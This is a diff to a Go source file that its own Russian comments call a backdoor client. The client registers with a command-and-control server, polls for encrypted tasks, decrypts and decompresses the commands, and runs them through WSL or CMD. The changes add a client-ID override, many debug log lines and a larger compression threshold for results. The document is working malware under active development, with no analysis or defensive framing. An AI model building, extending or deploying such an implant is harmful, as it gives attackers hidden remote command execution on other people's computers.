@@ -1,6 +1,7 @@
 // Package main - клиент (бэкдор).
 // Регистрируется на C2-сервере, периодически опрашивает наличие задач,
 // выполняет полученные команды и отправляет результаты обратно на сервер.
+// Поддерживает переопределение client_id через аргумент -id.
 package main
 
 import (
@@ -36,13 +37,27 @@ func main() {
 		log.Fatalf("Failed to load config: %v", err)
 	}
 
+	// Проверяем аргументы командной строки.
+	// Использование: client.exe -id client-002
+	for i := 1; i < len(os.Args); i++ {
+		if os.Args[i] == "-id" && i+1 < len(os.Args) {
+			config.ClientID = os.Args[i+1]
+			log.Printf("[INFO] Client ID overridden to: %s", config.ClientID)
+			break
+		}
+	}
+
 	log.Printf("[START] Client %s starting...", config.ClientID)
 
 	// Регистрируемся на сервере.
 	registerClient()
 
+	log.Printf("[TEST] Client %s entered main loop", config.ClientID)
+
 	// Основной цикл: опрос задач, выполнение, отправка результатов.
 	for {
+		log.Printf("[TEST] Loop iteration start for %s", config.ClientID)
+
 		task, err := pollTasks()
 		if err != nil {
 			log.Printf("[ERROR] Poll error: %v", err)
@@ -52,9 +67,13 @@ func main() {
 
 		// Если задач нет - ждём и продолжаем опрос.
 		if task.ID == "" {
+			log.Printf("[TEST] No tasks for %s, sleeping %d seconds", config.ClientID, config.PollInterval)
 			time.Sleep(time.Duration(config.PollInterval) * time.Second)
 			continue
 		}
+
+		// Если задача есть - выполняем.
+		log.Printf("[TEST] Task received for %s: ID=%s, Command=%s", config.ClientID, task.ID, task.Command)
 
 		// Выполняем полученную задачу.
 		log.Printf("[DECRYPT] Task decrypted: %s", task.Command)
@@ -113,6 +132,8 @@ func registerClient() {
 // pollTasks - опрашивает сервер на наличие задач.
 // Возвращает задачу или пустую структуру, если задач нет.
 func pollTasks() (models.Task, error) {
+	log.Printf("[TEST] pollTasks() called for %s", config.ClientID)
+
 	// Создаём пустой запрос (client_id в заголовке).
 	req := map[string]interface{}{}
 	jsonData, _ := json.Marshal(req)
@@ -125,18 +146,25 @@ func pollTasks() (models.Task, error) {
 	reqHTTP.Header.Set("Authorization", "Bearer "+config.ClientID)
 	reqHTTP.Header.Set("Content-Type", "application/json")
 
+	log.Printf("[TEST] Sending poll request to %s/api/poll with client_id=%s", config.ServerURL, config.ClientID)
+
 	resp, err := client.Do(reqHTTP)
 	if err != nil {
 		return models.Task{}, err
 	}
 	defer resp.Body.Close()
 
+	log.Printf("[TEST] Poll response status: %s", resp.Status)
+
 	// Проверяем ответ сервера.
 	var result map[string]interface{}
 	json.NewDecoder(resp.Body).Decode(&result)
 
 	status, _ := result["status"].(string)
+	log.Printf("[TEST] Poll response status field: %s", status)
+
 	if status == "no_tasks" {
+		log.Printf("[TEST] No tasks available for %s", config.ClientID)
 		return models.Task{}, nil
 	}
 
@@ -144,13 +172,17 @@ func pollTasks() (models.Task, error) {
 	authHeader := resp.Header.Get("Authorization")
 	token := getTokenFromBearer(authHeader)
 	if token == "" {
+		log.Printf("[TEST] No Authorization header in poll response for %s", config.ClientID)
 		return models.Task{}, nil
 	}
+
+	log.Printf("[TEST] Received encrypted task for %s", config.ClientID)
 
 	// Расшифровываем полученную задачу.
 	log.Println("[DECRYPT] Decrypting received task")
 	data, err := protocol.DecodeRequest(token)
 	if err != nil {
+		log.Printf("[TEST] Decryption error: %v", err)
 		return models.Task{}, err
 	}
 
@@ -159,11 +191,14 @@ func pollTasks() (models.Task, error) {
 	var task models.Task
 	json.Unmarshal(jsonData, &task)
 
+	log.Printf("[TEST] Decrypted task: ID=%s, Command=%s", task.ID, task.Command)
+
 	// Если команда была сжата - распаковываем её.
 	if task.Command != "" {
 		decompressed, err := crypto.Decompress([]byte(task.Command))
 		if err == nil {
 			task.Command = string(decompressed)
+			log.Printf("[TEST] Decompressed command: %s", task.Command)
 		}
 	}
 
@@ -173,7 +208,7 @@ func pollTasks() (models.Task, error) {
 // executeCommand - выполняет команду в оболочке.
 // Сначала пытается выполнить через WSL (для Linux-команд),
 // при ошибке - выполняет как Windows-команду через CMD.
-// Если результат длиннее 500 байт - сжимает его.
+// Если результат длиннее 5000 байт - сжимает его.
 func executeCommand(cmd string) (string, error) {
 	// Разбиваем команду на аргументы для проверки.
 	parts := strings.Fields(cmd)
